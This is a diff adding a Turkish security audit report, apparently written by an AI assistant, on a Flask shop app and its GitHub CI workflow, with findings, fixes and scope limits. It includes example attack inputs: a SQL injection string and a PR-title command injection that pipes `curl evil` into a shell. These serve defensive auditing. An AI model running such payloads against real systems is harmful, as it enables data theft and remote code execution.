@@ -1,0 +1,71 @@
+[probe p12]
+# Güvenlik denetimi: yayına almadan önce
+
+**Sonuç: Bu hâliyle yayına almayın.** 4 kritik, 3 yüksek bulgu var. Hepsini kodu okuyarak buldum. Kodu değiştirmedim.
+
+**Kapsam:** `app.py`, `requirements.txt`, `.github/workflows/ci.yml`. Tehdit: internetten gelen saldırgan.
+
+## Kritik
+
+1. **SQL injection** — `app.py:28`
+   - `customer` değeri doğrudan SQL metnine yazılıyor.
+   - Saldırı: `/orders?customer=' OR '1'='1` bütün siparişleri döker. `UNION` ile `users` tablosu da okunur.
+   - Çözüm: `?` parametresi kullanın, örneğin `execute("... WHERE customer = ?", (customer,))`.
+   - Test: Bu girdi sıfır satır dönmeli.
+
+2. **Yetkisiz yönetici ucu** — `app.py:32-36`
+   - `/admin/export` için giriş ya da yetki kontrolü yok.
+   - Saldırı: Herkes tüm kullanıcıları ve parola özetlerini indirir.
+   - Çözüm: Kimlik doğrulama ve yönetici rolü kontrolü ekleyin. Ya da ucu kaldırın.
+   - Test: Girişsiz istek 401/403 almalı.
+   - Aynı sorun `/orders` için de geçerli: giriş yok, `customer` değerini istemci seçiyor. Herkes başkasının siparişini görebilir (IDOR).
+
+3. **Debug modu açık, her adrese dinliyor** — `app.py:40`
+   - `debug=True` ile `host="0.0.0.0"` birlikte Werkzeug hata ayıklayıcısını internete açar.
+   - Saldırı: Uzaktan kod çalıştırma (RCE). Hata sayfaları da yığın izini gösterir.
+   - Çözüm: `debug=False`. Üretimde `app.run` yerine gunicorn gibi bir WSGI sunucusu kullanın.
+
+4. **CI: `pull_request_target` ile PR kodu çalışıyor** — `ci.yml:3,10-14`
+   - Bu olay depo sırlarına ve yazma yetkili token'a erişir. İş akışı ise PR'ın kodunu çekip `pip install` ve `pytest` çalıştırıyor.
+   - Saldırı: Dışarıdan biri PR açar. Testlere ya da `requirements.txt`'e kötü kod koyar. Sırlarınızı çalar.
+   - Ayrıca `ci.yml:13`: PR başlığı doğrudan `run` içine yazılıyor (komut enjeksiyonu). Başlık `"; curl evil|sh; "` olabilir.
+   - Çözüm: `pull_request` olayına geçin. Başlığı ortam değişkeniyle verin. `permissions: contents: read` ekleyin.
+
+## Yüksek
+
+5. **Parola MD5 ile saklanıyor** — `app.py:18`
+   - MD5 hızlı ve tuzsuz. Sızıntıda parolalar dakikalar içinde kırılır. Bulgu 2 ile birleşince tüm parolalar açığa çıkar.
+   - Çözüm: argon2, scrypt ya da bcrypt (12+). Mevcut kayıtlar için yeniden hash planı yapın.
+
+6. **Sabit gizli anahtar** — `app.py:7`
+   - `"change-me-secret-key"` kodda ve git geçmişinde duruyor. Oturum çerezleri sahte üretilebilir.
+   - Çözüm: Anahtarı ortamdan okuyun. Mevcut anahtarı sızmış sayıp değiştirin (önce rotasyon, sonra geçmiş temizliği).
+
+7. **Kayıt ucunda doğrulama ve sınır yok** — `app.py:16-21`
+   - `request.form["name"]` eksikse 400 hatası verir. Parola uzunluğu ve ad biçimi denetlenmiyor.
+   - Aynı ad ikinci kez kaydolabilir mi, belli değil. Tablo şeması koda dahil değil.
+   - Hız sınırı yok. Toplu kayıt ve kaba kuvvet denemesi mümkün.
+   - Çözüm: Şema ile doğrulama, benzersiz ad kısıtı, hız sınırı.
+
+## Orta / Düşük
+
+8. **Güvenlik başlıkları ve HTTPS yok.** CSP, HSTS, `X-Content-Type-Options` yok. Çerez bayrakları (`Secure`, `HttpOnly`, `SameSite`) ayarlanmamış. Bu uygulama TLS'i kendisi bitirmiyor; bir ters vekil gerekir.
+9. **Bağımlılık sabitlenmemiş.** `Flask>=3.1.3` üst sınırsız. Kilit dosyası yok. Sürüm sürüklenmesi ve tedarik zinciri riski var.
+10. **Hata işleme ve günlük yok.** Veritabanı hataları yakalanmıyor, 500 olarak dönüyor. Kimlik doğrulama olayları kaydedilmiyor.
+11. **Testler ve `.gitignore` yok.** CI `pytest` çalıştırıyor ama depoda test yok. `shop.db` ve `.env` yanlışlıkla commit'lenebilir.
+
+## Bakılmadı / çalıştırılamadı
+
+- **Mekanik taramalar "kontrol edilmedi".** `.pusula/checks/pusula_check.py` yok. Semgrep, gitleaks, osv-scanner, Bandit çalıştırılmadı.
+- **Git geçmişi taranmadı.** Başka sırlar olabilir.
+- **Bağımlılık açıkları** internet olmadığı için sorgulanmadı.
+- **Veritabanı şeması** ve dağıtım ortamı (ters vekil, güvenlik duvarı) depoda yok.
+
+## Önerilen sıra
+
+1. Bulgu 3 ve 4 (uzaktan kod çalıştırma ve CI sır sızıntısı). En küçük düzeltmeler.
+2. Bulgu 1 ve 2 (veri sızıntısı).
+3. Bulgu 5 ve 6.
+4. Geri kalanı.
+
+İsterseniz düzeltmeleri, her biri için önce başarısız olan bir testle, ayrı ayrı yaparım.
